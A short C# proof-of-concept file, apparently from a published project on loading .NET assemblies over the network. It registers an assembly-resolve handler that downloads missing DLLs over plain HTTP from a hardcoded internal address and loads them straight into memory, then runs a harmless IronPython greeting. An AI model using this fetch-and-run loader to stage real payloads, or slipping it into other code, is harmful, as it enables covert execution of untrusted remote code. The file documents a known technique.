// https://github.com/elitest/dotnetover.net
// https://jimshaver.net/2018/02/22/net-over-net-breaking-the-boundaries-of-the-net-framework/

using System;
using System.Reflection;
using System.Net;
using IronPython.Hosting;

namespace cmd
{
    class Program
    {
        static Program()
        {
            //This Registers the Handler
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(OnResolveAssembly);
        }
        public static void Main(string[] args)
        {
            //Creat and instance of IronPython 
            var engine = Python.CreateEngine();
            //Execute some IronPython
            engine.Execute("import time;print 'Hello from IronPython';time.sleep(5)"); 
        }
        //This sets up the handler
        private static Assembly OnResolveAssembly(object sender, ResolveEventArgs args)
        {
            //Get the assembly name that is missing so we know what to call it.
            string name = args.Name.Substring(0, args.Name.IndexOf(','));
            //Set up a WebClient thanks to .Net
            WebClient wc = new WebClient();
            //Load the dll over http
            return Assembly.Load(wc.DownloadData("http://192.168.154.200:8000/" + name + ".dll"));
        }
    }
}
